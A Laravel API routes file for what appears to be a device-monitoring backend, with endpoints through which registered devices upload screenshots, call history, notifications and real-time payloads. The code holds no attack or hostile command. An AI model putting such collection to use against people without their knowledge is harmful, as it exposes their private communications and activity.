<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Api\V1\DeviceController;
use App\Http\Controllers\Api\V1\SyncController;
use App\Http\Middleware\AuthenticateDevice;

Route::get('/user', function (Request $request) {
    return $request->user();
})->middleware('auth:sanctum');

/*
|--------------------------------------------------------------------------
| Device Registration (No auth required - first-time setup)
|--------------------------------------------------------------------------
*/
Route::prefix('v1')->group(function () {
    Route::post('/devices/register', [DeviceController::class, 'register']);
});

/*
|--------------------------------------------------------------------------
| Authenticated Device Endpoints
|--------------------------------------------------------------------------
*/
Route::prefix('v1')->middleware(AuthenticateDevice::class)->group(function () {
    // Device management
    Route::post('/devices/update-fcm', [DeviceController::class, 'updateFcmToken']);
    Route::post('/devices/heartbeat', [DeviceController::class, 'heartbeat']);

    // Data sync
    Route::post('/sync/screenshots', [SyncController::class, 'uploadScreenshots']);
    Route::post('/sync/screenshot', [SyncController::class, 'uploadSingleScreenshot']);
    Route::post('/sync/call-history', [SyncController::class, 'uploadCallHistory']);
    Route::post('/sync/realtime-payload', [SyncController::class, 'uploadRealtimePayload']);
    Route::post('/sync/notifications', [SyncController::class, 'uploadNotifications']);
});
